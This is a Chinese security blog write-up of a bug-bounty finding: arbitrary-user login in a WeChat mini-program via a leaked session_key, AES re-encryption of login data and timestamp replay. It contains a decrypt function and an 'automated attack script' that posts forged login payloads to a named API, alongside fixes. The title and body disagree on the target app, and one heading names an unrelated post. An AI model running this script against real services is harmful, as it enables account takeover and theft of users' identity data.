> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247489664&idx=1&sn=df572e4cbef72a5ed6c4de877b52b935

#  【SRC】某选课小程序任意用户登录漏洞深度剖析  
 不秃头的安全   2025-07-08 01:51  
  
# 记一次外网到EMQX 后渗透  

```
声明：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请私聊删除。
需要2025hvv情报群私聊我拉，需要加交流群在最下方。
知识星球在最下方，续费也有优惠私聊~~
考安全证书请联系vx咨询

```

  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVicZnY2QHwZ5IcH8K2iab4CPWBRzu1cWfFicict9hjW5ibbiaw4NueX6EJA1wyCHzloHPjnsNosPEIYkIQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp "")  
  
## 一、漏洞场景复现  
### （一）漏洞复现  
1. **目标系统**  
：某金融类小程序（版本V2.3.1）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGK7siaUTK4s2LQz5OSASAmYWcogCWy0ZEmW3edHjN07XwwWGrFmGLvKg/640?wx_fmt=png&from=appmsg "")  
1. **测试工具**  
：Burp Suite Pro v1.8.4 + WechatDevTools v1.18.0  
  
1. **关键参数**  
：  
  
1. 
```
encryptedData
```

  
：AES-CBC加密的用户敏感数据  
  
1. 
```
iv
```

  
：16字节初始化向量  
  
1. 
```
jsCode
```

  
：微信登录临时凭证（有效期5分钟）  
  
1. 缺失参数：
```
session_key
```

  
（会话密钥）  
  
1、抓包，发现有encryptedData和iv，但少了sessionkey，却多了jsCode等巴拉巴拉的参数和参数值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGqOP4djqFuKfB8aqsK8KgvKbTibl5Sl9mQZCnRicRCsawjKd09nm4LFcA/640?wx_fmt=png&from=appmsg "")  
发现appletLoginAuthUri所需要的参数，正好都一并泄露了，传入值，访问后 嗯，这不是正缺少的sessionkey吗  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGdT9w5lic6OhDicLM7XjoIjDMuOteEfsUNIKoZcxfXG9pDCa7ylTcse2Q/640?wx_fmt=png&from=appmsg "")  
使用bp的插件进行解密，发现sessionkey和iv和密文都是正确的，可以成功解出明文。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGA613ZicUcXsP5zypUltYzbdq1zYgCIKuCo6PWCibAjezsU8XicVW9ic5YQ/640?wx_fmt=png&from=appmsg "")  
重新生成密文，替换为原来的请求包，但是一直无法登录成功(没截图)猜测是时间戳的问题 重复原来的操作，并替换时间戳。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGhfsYWy12u43xW2uoeuXKiaDB9S0JVZn7mMURtLuttmkxxia49Nxdq0Xw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGFTh9EbUavbTOj2e5AYAanhQTRNJkPttrvZuGlJmJ1AWUYfwd4S5X2Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KNSPJhZj3ENMHDdFibMTYZGqibEiaeo7bUVcZxDokaUcncXdhzSfRb1lHuP8S8SCfl8gLORdM2j7jkw/640?wx_fmt=png&from=appmsg "")  
到此成功登录。  
## 二、漏洞原理分析  
### （一）加密链路缺陷  
1. **前端暴露密钥要素**  
  
通过小程序逆向工程发现：  

```
// wx.login接口明文返回jsCode
wx.login({
  success(res) {
    console.log(res.code); // 直接暴露jsCode
  }
});

```

  
  
1. **后端响应泄露密钥材料**  
  
抓取登录接口响应包：  

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  &#34;encryptedData&#34;: &#34;...&#34;,
  &#34;iv&#34;: &#34;...&#34;,
  &#34;session_key&#34;: &#34;0123456789abcdef0123456789abcdef&#34; // 核心密钥泄露
}

```

  
  
### （二）攻击链路推演  

```
graph TD
    A[获取jsCode] --> B[构造虚假登录请求]
    B --> C{后端响应}
    C -->|包含session_key| D[解密encryptedData]
    D --> E[伪造完整会话]
    E --> F[绕过实名认证]

```

## 三、漏洞利用实战  
### （一）密钥重组  
1. **AES-CBC参数准备**  

```
from Crypto.Cipher import AES
import base64

def decrypt(session_key, iv, encrypted_data):
    cipher = AES.new(session_key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
    return decrypted.decode('utf-8')

```

  
  
1. **时间戳同步突破**  
  
发现服务端时间校验逻辑：  

```
// 后端时间校验代码片段
long clientTime = request.getHeader(&#34;X-Timestamp&#34;);
if (Math.abs(clientTime - System.currentTimeMillis()) > 300000) {
    throw new InvalidTimestampException();
}

```

  
  
### （二）自动化攻击脚本  

```
import requests
import time

TARGET_URL = &#34;https://api.wechat-loan.com/login&#34;
HEADERS = {
    &#34;User-Agent&#34;: &#34;Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.36&#34;,
    &#34;X-Requested-With&#34;: &#34;XMLHttpRequest&#34;
}

def exploit():
    # 获取当前时间戳（毫秒）
    timestamp = int(time.time() * 1000)
    
    # 构造恶意请求
    payload = {
        &#34;jsCode&#34;: &#34;023f4a5b6c8d9e0f1a2b3c4d5e6f7a8b9c&#34;,
        &#34;encryptedData&#34;: &#34;CvYyQ2...&#34;,
        &#34;iv&#34;: &#34;XyZwVu...&#34;,
        &#34;timestamp&#34;: timestamp
    }
    
    # 发送请求
    response = requests.post(TARGET_URL, json=payload, headers=HEADERS)
    
    # 时间戳修正循环
    while&#34;invalid timestamp&#34;in response.text.lower():
        timestamp += 1000# 毫秒级微调
        payload[&#34;timestamp&#34;] = timestamp
        response = requests.post(TARGET_URL, json=payload, headers=HEADERS)
    
    return response.json()

if __name__ == &#34;__main__&#34;:
    session = exploit()
    print(&#34;Session Token:&#34;, session.get(&#34;token&#34;))

```

## 四、漏洞危害评估  
### （一）攻击面分析  
1. **数据窃取链路**  
  
1. 用户实名信息（姓名/身份证号）  
  
1. 微信绑定手机号  
  
1. 设备硬件特征码  
  
1. 通过
```
encryptedData
```

  
可解析出：  
  
1. **业务风险场景**  
  
1. 绕过风控策略批量注册虚假账号  
  
1. 操纵高价值账户进行非法转账  
  
1. 结合短信嗅探实现完整账户接管  
  
## 五、防御体系重构建议  
### （一）加密机制升级  
1. **密钥管理体系**  
  
1. 采用ECDH密钥协商协议动态生成session_key  
  
1. 实现密钥轮转机制（每7天更换）  
  
1. **加密算法强化**  

```
// 推荐加密方案（Java实现）
Cipher cipher = Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;);
cipher.init(Cipher.ENCRYPT_MODE, secretKey, new GCMParameterSpec(128, iv));

```

  
  
### （二）时间戳防御矩阵  
1. **时钟回拨防护**  

```
# 服务端时间校验逻辑
def validate_timestamp(client_ts):
    server_ts = time.time()
    if abs(server_ts - client_ts) > 5 * 60:
        raise TimeAttackDetected()
    if client_ts < (server_ts - 300):
        raise TimestampBacktrackDetected()

```

  
  
1. **时区标准化处理**  
  
强制所有请求携带
```
X-Timezone
```

  
头并进行UTC时间校准。  
  
## 六、总结与启示  
  
本案例揭示了典型移动端安全三大黑洞：  
1. **加密组件滥用**  
：AES-CBC模式缺乏完整性保护  
  
1. **时间校验缺失**  
：5分钟时间窗口足以实施暴力破解  
  
1. **敏感参数泄露**  
：前端暴露关键密钥要素  
  
建议企业立即开展：  
1. 小程序专项安全审计（每季度一次）  
  
1. 建立API参数黑白名单管控机制  
  
1. 部署RASP实时攻击检测系统  
  
  
  
往期推荐：  
  
[记一次外网到EMQX 后渗透](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247489651&idx=1&sn=87ab1c419b4ff8432ca1195433319546&scene=21#wechat_redirect)  
  
  
[工具分享 | Nuclei POC漏洞验证图形化工具更新至v3.1.5](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247489610&idx=1&sn=f23cc2d5870633e77a858d561d8cc831&scene=21#wechat_redirect)  
  
  
[工具分享 | BP插件 SMS Bomb Fuzzer更新 V3.1](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247489591&idx=1&sn=87c83760491e128ef0b86581936b0d8b&scene=21#wechat_redirect)  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVicZnY2QHwZ5IcH8K2iab4CPJRHe1bUSmPmKF4qFypdXGicib2vpibXoUxs3Ht0aic8uOKzUFkBSicfGMTg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&watermark=1&tp=webp "")  
  
**关于我们:**  
  
感谢各位大佬们关注-不秃头的安全，后续会坚持更新渗透漏洞思路分享、安全测试、好用工具分享以及挖掘SRC思路等文章，同时会组织不定期抽奖，希望能得到各位的关注与支持，考证请加联系vx咨询。  
  
  
## 1. 需要考以下各类安全证书的可以联系  
  
cn*d\cnn*d(量少)中高证书，学生pte超低价，绝对低价绝对优惠，CISP、PTE/PTS、DSG、IRE/IRS、NISP、PMP、CCSK、CISSP、ISO27001、IT服务项目经理等等巨优惠，想加群下方链接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fWHMbic1sSgjjTZ0C4kj0iaNcopuAxHjSib3oRxaAUJJH4xicDXDibJXepzSbUPLDXiacZ2LFFkecvz5iasw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fWHMbic1sSgjjTZ0C4kj0iaNcvDt2M2C42HorzC44C5UE024OWM4aiaZkmu9jz9iarWODbCW8BTktt5UQ/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVicZnY2QHwZ5IcH8K2iab4CPcGGuzP5JjTHibseyoDnwmZgKf1RbXicYHiaeoomSBAghebXKLjE53JpcA/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&watermark=1&tp=webp "")  
## 2. 需要入星球的可以私聊优惠  
  
星球里有什么？  

```
1、维护更新src、cnxd、cnnxd专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、fafo/零零信安/QUAKE 高级会员key
3、POC及CXXD及CNNXD通用报告详情分享思路
4、知识星球专属微信“内部圈子交流群”
5、分享src挖掘技巧tips
6、最新新鲜工具分享
7、不定期有工作招聘内推（工作/护网内推）
8、攻防演练资源分享(免杀，溯源，钓鱼等)
9、19个专栏会持续更新~提前续费有优惠，好用不贵很实惠

```

  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVicZnY2QHwZ5IcH8K2iab4CPTWXc6AXYqgecYQ8hXQPquoChib0J5TQK92p7xfQpQ35ibzYScVHDI7Rg/640?wx_fmt=jpeg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
## 3、其他合作（合法合规）  
  
1、承接各种安全项目（须有授权），需要攻防团队或岗位招聘都可代发、代招（灰黑勿扰）；  
  
2、各位安全老板需要文章推广的请私聊，承接合法合规推广文章发布，可直发、可按产品编辑推广；  
合作、推广代发、安全项目、岗位代招均可发布  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVicZnY2QHwZ5IcH8K2iab4CPFDicex7vNaKaXjGZa5TM7ObAyZgj14jtHIR9RRsbAibDsVibFvJjONVlg/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
